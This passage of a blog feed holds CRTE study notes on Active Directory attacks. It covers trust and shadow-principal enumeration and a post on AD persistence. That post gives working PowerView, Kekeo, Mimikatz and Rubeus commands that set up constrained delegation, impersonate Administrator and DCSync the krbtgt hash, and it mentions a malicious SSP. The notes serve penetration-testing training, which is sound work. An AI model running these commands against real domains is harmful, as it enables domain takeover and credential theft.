</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$bastiondc</span><span class="w">
</span></code></pre></div></div>

<p>Check which users are members of the Shadow Principals:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="p">(</span><span class="s2">"CN=Shadow Principal Configuration,CN=Services,"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="o">.</span><span class="nf">configurationNamingContext</span><span class="p">)</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">member</span><span class="p">,</span><span class="nx">msDS-ShadowPrincipalSid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="p">}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$bastiondc</span><span class="w">
</span></code></pre></div></div>

<p>Establish a direct PSRemoting session on bastion-dc and access production.local:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nx">192.168.102.1</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
</span></code></pre></div></div>

<p>All attacks paths:</p>

<p><img src="/assets/images/posts/crte/5.png" alt="Alt text" class="align-center" /></p>]]></content><author><name>Nullified</name></author><category term="notes" /><category term="crte" /><category term="intermediate" /><category term="AD" /><category term="Windows" /><summary type="html"><![CDATA[ADCS, Shadow Credentials, Azure AD Integration, Foreign Security Principals and More]]></summary></entry><entry><title type="html">3 - AD Persistence</title><link href="http://localhost:4000/notes/crte/adpersistence/" rel="alternate" type="text/html" title="3 - AD Persistence" /><published>2023-12-29T00:00:00+06:00</published><updated>2023-12-29T00:00:00+06:00</updated><id>http://localhost:4000/notes/crte/adpersistence</id><content type="html" xml:base="http://localhost:4000/notes/crte/adpersistence/"><![CDATA[<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="ad-persistence">AD Persistence</h1>

<p>Some content are similar to CRTP:</p>

<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domdom/">AD Persistence - CRTP</a></p>

<h2 id="msds-allowedtodelegateto-constrained-delegation">msDS-AllowedToDelegateTo (Constrained Delegation)</h2>

<p>Note that the <strong>msDS-AllowedToDelegateTo</strong> is the user account flag which controls the services to which a user account has access to.</p>

<blockquote>
  <p>This means, with enough privileges, it is possible to access any service from a user</p>
</blockquote>

<ul>
  <li>Enough privileges? – SeEnableDelegationPrivilege on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins.</li>
  <li>That is, we can force set <strong>Trusted to Authenticate for Delegation</strong> and <strong>ms-DS-AllowedToDelegateTo</strong> on a user (or create a new user - which is more noisy) and abuse it later.</li>
</ul>

<p><strong>Using PowerView</strong>:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">devuser</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'dev/svc'</span><span class="p">}</span><span class="w">
</span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">devuser</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="s2">"msds-allowedtodelegateto"</span><span class="o">=</span><span class="s2">"ldap/dc.domain.local"</span><span class="p">}</span><span class="w">
</span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">devuser1</span><span class="w"> </span><span class="o">-Xor</span><span class="w"> </span><span class="p">@{</span><span class="s2">"useraccountcontrol"</span><span class="o">=</span><span class="s2">"16777216"</span><span class="p">}</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="err">–</span><span class="nx">TrustedToAuth</span><span class="w">
</span></code></pre></div></div>

<p><strong>Using AD module</strong>:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">devuser</span><span class="w"> </span><span class="nt">-ServicePrincipalNames</span><span class="w"> </span><span class="p">@{</span><span class="nx">Add</span><span class="o">=</span><span class="s1">'dev/svc'</span><span class="p">}</span><span class="w">
</span><span class="n">Set-ADUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">devuser</span><span class="w"> </span><span class="nt">-Add</span><span class="w"> </span><span class="p">@{</span><span class="s1">'msDS-AllowedToDelegateTo'</span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'ldap/us-dc'</span><span class="p">,</span><span class="s1">'ldap/dc.domain.local'</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Set-ADAccountControl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">devuser</span><span class="w"> </span><span class="nt">-TrustedToAuthForDelegation</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w">
</span></code></pre></div></div>

<h3 id="abuse-using-kekeo">Abuse using Kekeo</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kekeo</span><span class="c"># tgt::ask /user:devuser /domain:domain.local /password:Password@123!</span><span class="w">
</span><span class="n">kekeo</span><span class="c"># tgs::s4u /tgt:TGT_devuser@domain.local_krbtgt~us.techcorp.local@domain.local.kirbi /user:Administrator@domain.local /service:ldap/domain.local</span><span class="w">
</span><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt TGS_Administrator@us.techcorp.local@domain.local_ldap~dc.domain.local@domain.local.kirbi"'</span><span class="w">
</span><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\krbtgt"'</span><span class="w">
</span></code></pre></div></div>

<h3 id="abuse-using-rubeus">Abuse using Rubeus:</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Password</span><span class="err">@</span><span class="nx">123</span><span class="o">!</span><span class="w"> </span><span class="nx">/user:devuser</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:devuser</span><span class="w"> </span><span class="nx">/rc4:539259E25A0361EC4A227DD9894719F6</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:ldap/dc.domain.local</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div></div>

<h2 id="malicious-ssp">Malicious SSP</h2>

<ul>
  <li>All local logons on the DC are logged to <strong>C:\Windows\system32\kiwissp.log</strong></li>
</ul>

<p><img src="/assets/images/posts/crte/2.png" alt="Alt text" class="align-center" /></p>]]></content><author><name>Nullified</name></author><category term="notes" /><category term="crte" /><category term="intermediate" /><category term="AD" /><category term="Windows" /><category term="peristence" /><summary type="html"><![CDATA[Constrained Deleg and Malicious SSP]]></summary></entry></feed>